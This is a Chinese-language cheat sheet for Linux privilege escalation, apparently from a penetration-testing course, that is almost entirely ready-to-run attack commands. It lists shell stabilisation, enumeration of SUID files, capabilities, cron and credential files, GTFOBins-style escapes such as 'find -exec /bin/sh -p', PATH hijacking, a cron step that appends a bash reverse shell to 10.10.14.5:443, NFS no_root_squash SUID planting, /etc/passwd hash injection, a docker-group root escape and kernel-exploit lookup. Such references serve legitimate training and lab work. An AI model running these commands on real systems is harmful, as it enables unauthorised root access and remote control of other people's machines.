# 速查：Linux 提權

> 原理看 [Ch 20](../20-linux-privesc-methodology.md)–[Ch 24](../24-linux-enum-tools.md)。GTFOBins：gtfobins.github.io

## 第一步：穩定 shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z → stty raw -echo; fg → Enter → export TERM=xterm
```

## 枚舉清單（依優先序）

```bash
id; sudo -l                            # ← 先看這個
find / -perm -4000 -type f 2>/dev/null # SUID
getcap -r / 2>/dev/null                # capabilities
cat /etc/crontab; ls -la /etc/cron.*   # cron
ls -la /; find / -writable -type d 2>/dev/null   # 可寫位置
cat /etc/passwd; uname -a; cat /etc/os-release
# 憑證：history、.bashrc、config、.ssh、/var/www、db 設定檔
```

## sudo

```bash
sudo -l                                # 列出可 sudo 的命令
# 任何命令 → 查 GTFOBins 的 sudo 區塊
sudo <binary> → GTFOBins escape
# CVE：sudo < 1.9.5p2 → Baron Samedit (CVE-2021-3156)
```

## SUID

```bash
find / -perm -4000 -type f 2>/dev/null
# 標準 binary（find/vim/nmap/cp/bash…）→ GTFOBins SUID 區塊
# 範例
./find . -exec /bin/sh -p \; -quit
# 自訂 binary → strings/ltrace 看它呼叫什麼 → 常見 PATH 劫持
```

## PATH 劫持 / 相對路徑

```bash
# SUID binary 用相對路徑呼叫（如 system("ls")）
cd /tmp
echo '/bin/bash -p' > ls; chmod +x ls
export PATH=/tmp:$PATH
/path/to/suid_binary
```

## Cron

```bash
cat /etc/crontab
# root 跑的腳本你可寫 → 塞反彈 shell
echo 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1' >> /path/writable_script.sh
# 腳本用萬用字元 tar/* → wildcard injection
```

## NFS root squash

```bash
# Kali（已 root）
showmount -e IP
mount -o rw IP:/share /mnt
# no_root_squash → 在 /mnt 放 SUID binary
cp /bin/bash /mnt/bash; chmod +s /mnt/bash
# 靶機：/share/bash -p
```

## 其他

```bash
# 可寫 /etc/passwd
openssl passwd -1 -salt x pass          # 產 hash 塞進去 root 行
# Docker 群組
id | grep docker → docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# 內核（最後手段，確認版本精確）
uname -r → searchsploit linux kernel <ver>   # DirtyCow / PwnKit / DirtyPipe
```

## 自動化

```bash
./linpeas.sh | tee linpeas.out          # 紅/黃是提示不是答案
# 傳輸：Kali python3 -m http.server 80 → 靶機 curl/wget
```

## 鐵律
- 順序：`sudo -l` → SUID → cron → 可寫檔/服務 → capabilities → NFS → 內核
- 內核 exploit 擺最後（可能弄當機）
